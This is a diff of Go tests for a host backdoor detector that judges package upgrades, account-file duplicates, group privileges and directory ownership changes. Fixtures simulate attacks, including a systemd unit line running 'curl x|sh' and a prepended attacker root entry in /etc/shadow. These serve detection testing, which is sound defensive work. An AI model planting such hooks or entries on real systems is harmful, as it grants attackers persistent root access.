@@ -59,7 +59,7 @@ func clean() *model.Collection {
 		Accounts: model.Accounts{
 			Users: []model.User{{Name: "root", UID: 0, GID: 0, Home: "/root", Shell: "/bin/bash",
 				Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "digest-root-1", LastChange: 20000}}},
-			Groups: []model.Group{{Name: "root", GID: 0}, {Name: "sudo", GID: 27}, {Name: "staff", GID: 50}},
+			Groups: []model.Group{{Name: "root", GID: 0}, {Name: "sudo", GID: 27}, {Name: "staff", GID: 50}, {Name: "users", GID: 100}},
 		},
 		Packages: model.Packages{Installed: []model.Package{
 			pkg("openssl", "3.0.14-1~deb12u2", "/usr/bin/openssl", "/usr/share/doc/openssl/README"),
@@ -321,7 +321,7 @@ func TestJudgeDowngradeIsBackdoor(t *testing.T) {
 	if !strings.Contains(f.Fix, "apt-get install -- 'openssh-server=1:9.2p1-2+deb12u3'") {
 		t.Errorf("fix %q", f.Fix)
 	}
-	if f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || f.Evidence[0].After != "1:9.2p1-2+deb12u1" {
+	if f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || !strings.HasPrefix(f.Evidence[0].After, "1:9.2p1-2+deb12u1; files sha256:") {
 		t.Errorf("evidence %+v", f.Evidence[0])
 	}
 }
@@ -796,7 +796,7 @@ func TestJudgePrivilegedGroupMember(t *testing.T) {
 		switch cur.Accounts.Groups[i].Name {
 		case "sudo":
 			cur.Accounts.Groups[i].Members = []string{"deploy"}
-		case "staff":
+		case "staff", "users":
 			cur.Accounts.Groups[i].Members = []string{"deploy"}
 		}
 	}
@@ -805,7 +805,9 @@ func TestJudgePrivilegedGroupMember(t *testing.T) {
 	if !strings.Contains(f.Fix, "gpasswd -d 'deploy' -- 'sudo'") {
 		t.Errorf("fix %q", f.Fix)
 	}
-	must(t, r, "snap.group:staff", model.SevNote)
+	// staff can write /usr/local, which comes first in root's PATH.
+	must(t, r, "snap.group:staff", model.SevBackdoor)
+	must(t, r, "snap.group:users", model.SevNote)
 }
 
 func TestJudgeListenerAdded(t *testing.T) {
@@ -1226,13 +1228,15 @@ func TestJudgeUnofficialUpgradeIsBackdoor(t *testing.T) {
 
 	r := run(cur, snapOf(old), res)
 	f := must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
-	if !hasEvidencePath(f, "/usr/sbin/sshd") || f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || f.Evidence[0].After != "1:9.2p1-2+deb12u9" {
+	if !hasEvidencePath(f, "/usr/sbin/sshd") || f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || !strings.HasPrefix(f.Evidence[0].After, "1:9.2p1-2+deb12u9; files sha256:") {
 		t.Errorf("evidence %+v", f.Evidence)
 	}
-	if hasEvidencePath(f, "/usr/share/doc/openssh-server/README") {
-		t.Errorf("a documentation file is not a program: %+v", f.Evidence)
+	// Nothing a version no trusted source has changed is explained: the
+	// documentation file is listed too.
+	if !hasEvidencePath(f, "/usr/share/doc/openssh-server/README") {
+		t.Errorf("non-program file of an unconfirmed version not listed: %+v", f.Evidence)
 	}
-	if !strings.Contains(f.Title, "1 program") {
+	if !strings.Contains(f.Title, "2 files changed") {
 		t.Errorf("title %q", f.Title)
 	}
 	if explained(r, "explained:openssh-server") != nil {
@@ -1370,13 +1374,23 @@ func TestJudgeAccountFilesComparedWhenAccountsDoNotExplainThem(t *testing.T) {
 }
 
 func TestJudgeDuplicateAccountNames(t *testing.T) {
+	// A collection that still lists both entries.
 	c := clean()
 	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "root", UID: 0, Home: "/root", Shell: "/bin/sh"})
-	f := must(t, run(c, nil, nil), "acct.duplicate:root", model.SevBackdoor)
+	f := must(t, run(c, nil, nil), "acct.duplicate:/etc/passwd:root", model.SevBackdoor)
 	if len(f.Evidence) != 2 {
 		t.Errorf("evidence %+v", f.Evidence)
 	}
-	must(t, run(c, snapOf(clean()), nil), "acct.duplicate:root", model.SevBackdoor)
+	must(t, run(c, snapOf(clean()), nil), "acct.duplicate:/etc/passwd:root", model.SevBackdoor)
+
+	// What the collector reports: duplicates and lines glibc rejects.
+	c = clean()
+	c.Accounts.Duplicates = []string{"/etc/shadow:root", "/etc/group:sudo"}
+	c.Accounts.Malformed = []string{"/etc/passwd:7"}
+	r := run(c, nil, nil)
+	must(t, r, "acct.duplicate:/etc/shadow:root", model.SevBackdoor)
+	must(t, r, "acct.duplicate:/etc/group:sudo", model.SevBackdoor)
+	must(t, r, "acct.malformed:/etc/passwd:7", model.SevBackdoor)
 }
 
 // I3: boot files fold only into the packages that rebuild them.
@@ -1761,4 +1775,235 @@ func TestJudgeUncheckedSpecialFilesWithoutSnapshot(t *testing.T) {
 		must(t, r, "pkg.unverifiable:"+ko.Path, model.SevBackdoor)
 		absent(t, r, "pkg.unchecked_changes")
 	}
+}
+
+// --- review round 2 ---
+
+func sshBase() *model.Collection {
+	old := clean()
+	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd", "/usr/lib/systemd/system/ssh.service"))
+	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755), file("/usr/lib/systemd/system/ssh.service", "ExecStart=/usr/sbin/sshd -D", 0o644))
+	return old
+}
+
+// upgradeSSH changes sshd at a new version and reports it with kind.
+func upgradeSSH(old *model.Collection, version, content, kind, reason string) (*model.Collection, *pkgverify.Result) {
+	cur := clone(old)
+	setVersion(cur, "openssh-server", version)
+	setFile(cur, file("/usr/sbin/sshd", content, 0o755))
+	res := archive()
+	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: version, Actual: h(content), Reason: reason, Kind: kind}}
+	return cur, res
+}
+
+// R58: only network kinds fold into the note on unchecked files; kinds that
+// come from data root can write are backdoor signs.
+func TestJudgeOnlyNetworkKindsAreUnchecked(t *testing.T) {
+	old := sshBase()
+	for _, tc := range []struct {
+		kind    string
+		folds   bool
+		version string
+	}{
+		{pkgverify.KindUnreachable, true, "1:9.2p1-2+deb12u9"},
+		{pkgverify.KindBadSignature, true, "1:9.2p1-2+deb12u9"},
+		{pkgverify.KindNotInBundle, true, "1:9.2p1-2+deb12u9"},
+		{pkgverify.KindPro, false, "1:9.2p1-2+deb12u9+esm1"}, // Debian: "+esm" is just text in a version
+		{pkgverify.KindUnsupportedArch, false, "1:9.2p1-2+deb12u9"},
+		{pkgverify.KindBudget, false, "1:9.2p1-2+deb12u9"},
+		{pkgverify.KindNotHashed, false, "1:9.2p1-2+deb12u9"},
+		{pkgverify.KindNotChecked, false, "1:9.2p1-2+deb12u9"},
+	} {
+		cur, res := upgradeSSH(old, tc.version, "trojan sshd", tc.kind, "reason for "+tc.kind)
+		r := run(cur, snapOf(old), res)
+		if tc.folds {
+			absent(t, r, "snap.pkg_upgraded:openssh-server")
+			must(t, r, "pkg.unchecked_changes", model.SevNote)
+		} else {
+			must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
+			absent(t, r, "pkg.unchecked_changes")
+			if r.ExitCode != 2 {
+				t.Errorf("%s: exit %d", tc.kind, r.ExitCode)
+			}
+		}
+	}
+
+	// Ubuntu with an ESM source: a Pro package that could not be checked
+	// without a Pro token is unchecked, not a backdoor sign.
+	ub := sshBase()
+	ub.Host.OSID = "ubuntu"
+	ub.Packages.Sources = []model.AptSource{{URIs: []string{"https://esm.ubuntu.com/apps/ubuntu"}, Suites: []string{"noble-apps-security"}}}
+	cur, res := upgradeSSH(ub, "1:9.6p1-3ubuntu13.5+esm1", "sshd esm", pkgverify.KindPro, pkgverify.ReasonPro)
+	r := run(cur, snapOf(ub), res)
+	absent(t, r, "snap.pkg_upgraded:openssh-server")
+	must(t, r, "pkg.unchecked_changes", model.SevNote)
+
+	// The package budget: still a backdoor sign, and the limit is a note.
+	cur, res = upgradeSSH(old, "1:9.2p1-2+deb12u9", "trojan sshd", pkgverify.KindBudget, "not checked: the collection lists more than 10000 packages")
+	b := must(t, run(cur, snapOf(old), res), "pkg.budget_exceeded", model.SevNote)
+	if !strings.Contains(b.Why, "unusual") {
+		t.Errorf("budget why %q", b.Why)
+	}
+}
+
+// R58/R55: the same rules without a snapshot, for setuid programs, kernel
+// modules, PAM modules and boot files; an unsupported host is a limit of
+// the whole scan.
+func TestJudgeSpecialFileKindsWithoutSnapshot(t *testing.T) {
+	c := clean()
+	c.Packages.Installed = append(c.Packages.Installed, model.Package{Name: "sudo", Version: "1.9.13p3-1+deb12u1", Arch: "mips64el", Status: "install ok installed", Files: []string{"/usr/bin/sudo"}})
+	c.Files = append(c.Files, file("/usr/bin/sudo", "trojan sudo", 0o4755))
+	res := func(kind, reason string) *pkgverify.Result {
+		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
+			{Path: "/usr/bin/sudo", Package: "sudo", Version: "1.9.13p3-1+deb12u1", Actual: h("trojan sudo"), Reason: reason, Kind: kind}}}
+	}
+	for _, kind := range []string{pkgverify.KindUnsupportedArch, pkgverify.KindPro, pkgverify.KindBudget, pkgverify.KindNotHashed, pkgverify.KindNotChecked, ""} {
+		r := run(c, nil, res(kind, "reason"))
+		must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
+		absent(t, r, "pkg.unchecked_changes")
+	}
+	r := run(c, nil, res(pkgverify.KindScanLimit, `host architecture "riscv64" is not supported for package verification`))
+	absent(t, r, "pkg.unverifiable:/usr/bin/sudo")
+	absent(t, r, "pkg.unchecked_changes")
+	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "riscv64") }) {
+		t.Errorf("scan limit not stated: %q", r.CouldNotRuleOut)
+	}
+}
+
+// R60: a version no trusted source has explains none of its files, programs
+// or not.
+func TestJudgeUnconfirmedVersionExplainsNoFile(t *testing.T) {
+	old := sshBase()
+	cur := clone(old)
+	v := "1:9.2p1-2+deb12u9"
+	setVersion(cur, "openssh-server", v)
+	unit := "ExecStartPre=/bin/sh -c 'curl x|sh'\nExecStart=/usr/sbin/sshd -D"
+	setFile(cur, file("/usr/lib/systemd/system/ssh.service", unit, 0o644))
+	res := archive()
+	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/lib/systemd/system/ssh.service", Package: "openssh-server", Version: v, Actual: h(unit), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
+	r := run(cur, snapOf(old), res)
+	f := must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
+	if !hasEvidencePath(f, "/usr/lib/systemd/system/ssh.service") {
+		t.Errorf("changed unit not listed: %+v", f.Evidence)
+	}
+	if explained(r, "explained:openssh-server") != nil || r.ExitCode != 2 {
+		t.Errorf("explained or wrong exit %d", r.ExitCode)
+	}
+}
+
+// R59: the account files as glibc reads them; duplicates and rejected lines
+// are backdoor signs, and only a clean file gets the ageing/GECOS note.
+func TestJudgeAccountFileAnomalies(t *testing.T) {
+	old := clean()
+	old.Files = append(old.Files, file("/etc/shadow", "root:$y$orig:20000:0:99999:7:::", 0o640))
+	cur := clone(old)
+	// A root line prepended: glibc uses it, so the collector does too, and
+	// records the duplicate.
+	setFile(cur, file("/etc/shadow", "root:$6$attacker:20000:0:99999:7:::\nroot:$y$orig:20000:0:99999:7:::", 0o640))
+	cur.Accounts.Users[0].Password.Digest = "digest-attacker"
+	cur.Accounts.Duplicates = []string{"/etc/shadow:root"}
+	r := run(cur, snapOf(old), nil)
+	must(t, r, "acct.duplicate:/etc/shadow:root", model.SevBackdoor)
+
+	// The file changed and the comparison saw nothing, but it holds a
+	// rejected line: not the ageing note.
+	cur2 := clone(old)
+	setFile(cur2, file("/etc/shadow", "root:$y$orig:20000:0:99999:7:::\nroot:$6$x", 0o640))
+	cur2.Accounts.Malformed = []string{"/etc/shadow:2"}
+	r = run(cur2, snapOf(old), nil)
+	must(t, r, "acct.malformed:/etc/shadow:2", model.SevBackdoor)
+	must(t, r, "snap.file_modified:/etc/shadow", model.SevBackdoor)
+
+	// A new group with a privileged group's id is as privileged.
+	old3 := clean()
+	cur3 := clone(old3)
+	cur3.Accounts.Groups = append(cur3.Accounts.Groups, model.Group{Name: "sudo2", GID: 27, Members: []string{"eve"}})
+	must(t, run(cur3, snapOf(old3), nil), "snap.group:sudo2", model.SevBackdoor)
+}
+
+// A system directory handed to an ordinary account is a backdoor sign even
+// when its mode stays the same.
+func TestJudgeDirectoryGivenAway(t *testing.T) {
+	old := clean()
+	old.Files = append(old.Files, model.FileEntry{Path: "/usr/local/sbin", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken},
+		model.FileEntry{Path: "/etc/systemd/system", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken})
+	cur := clone(old)
+	setFile(cur, model.FileEntry{Path: "/usr/local/sbin", Type: "dir", Mode: 0o040755, UID: 1000, MTime: changed, CTime: changed})
+	setFile(cur, model.FileEntry{Path: "/etc/systemd/system", Type: "dir", Mode: 0o040755, UID: 1000, MTime: changed, CTime: changed})
+	r := run(cur, snapOf(old), archive())
+	for _, p := range []string{"/usr/local/sbin", "/etc/systemd/system"} {
+		f := must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
+		if !strings.Contains(f.Fix, "chown 0:0") {
+			t.Errorf("%s fix %q", p, f.Fix)
+		}
+	}
+}
+
+// N3: an exception on a package change covers exactly the files it
+// accepted; other content at the same version is a finding again.
+func TestJudgePackageExceptionsCoverFileContents(t *testing.T) {
+	old := sshBase()
+	v := "1:9.2p1-2+deb12u9+local1"
+	s := snapOf(old)
+	cur, res := upgradeSSH(old, v, "my patched sshd", pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
+	f := must(t, run(cur, s, res), "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
+	s.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
+	absent(t, run(cur, s, res), "snap.pkg_upgraded:openssh-server")
+	cur2, res2 := upgradeSSH(old, v, "attacker sshd", pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
+	must(t, run(cur2, s, res2), "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
+
+	// A new package.
+	old2 := clean()
+	s2 := snapOf(old2)
+	mk := func(content string) (*model.Collection, *pkgverify.Result) {
+		c := clone(old2)
+		c.Packages.Installed = append(c.Packages.Installed, pkg("foo", "1.0", "/usr/bin/foo"))
+		c.Files = append(c.Files, file("/usr/bin/foo", content, 0o755))
+		r := archive()
+		r.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/bin/foo", Package: "foo", Version: "1.0", Actual: h(content), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
+		return c, r
+	}
+	c3, r3 := mk("foo v1")
+	f = must(t, run(c3, s2, r3), "snap.pkg_installed:foo", model.SevBackdoor)
+	s2.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
+	absent(t, run(c3, s2, r3), "snap.pkg_installed:foo")
+	c4, r4 := mk("foo trojaned")
+	must(t, run(c4, s2, r4), "snap.pkg_installed:foo", model.SevBackdoor)
+
+	// The note on unchecked files.
+	s3 := snapOf(old)
+	cur5, res5 := upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd a", pkgverify.KindUnreachable, "timeout")
+	u := must(t, run(cur5, s3, res5), "pkg.unchecked_changes", model.SevNote)
+	s3.Exceptions = []model.Exception{{FindingKey: u.Key, AcceptedValue: currentValue(u), At: taken}}
+	absent(t, run(cur5, s3, res5), "pkg.unchecked_changes")
+	cur6, res6 := upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd b", pkgverify.KindUnreachable, "timeout")
+	must(t, run(cur6, s3, res6), "pkg.unchecked_changes", model.SevNote)
+}
+
+// An architecture edited in dpkg status shows as an install and a removal
+// of the same name; the package is judged once, as the one installed now.
+func TestJudgeArchitectureSwitch(t *testing.T) {
+	old := sshBase()
+	cur := clone(old)
+	for i := range cur.Packages.Installed {
+		if cur.Packages.Installed[i].Name == "openssh-server" {
+			cur.Packages.Installed[i].Arch = "mips64el"
+		}
+	}
+	setFile(cur, file("/usr/sbin/sshd", "trojan sshd", 0o755))
+	res := archive()
+	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "1:9.2p1-2+deb12u3", Actual: h("trojan sshd"), Reason: `unsupported architecture "mips64el"`, Kind: pkgverify.KindUnsupportedArch}}
+	r := run(cur, snapOf(old), res)
+	absent(t, r, "snap.pkg_removed:openssh-server")
+	f := must(t, r, "snap.pkg_installed:openssh-server", model.SevBackdoor)
+	if !hasEvidencePath(f, "/usr/sbin/sshd") {
+		t.Errorf("evidence %+v", f.Evidence)
+	}
+}
+
+// A collection that still lists a group twice.
+func TestJudgeDuplicateGroupEntries(t *testing.T) {
+	c := clean()
+	c.Accounts.Groups = append(c.Accounts.Groups, model.Group{Name: "sudo", GID: 27, Members: []string{"eve"}})
+	must(t, run(c, nil, nil), "acct.duplicate:/etc/group:sudo", model.SevBackdoor)
 }
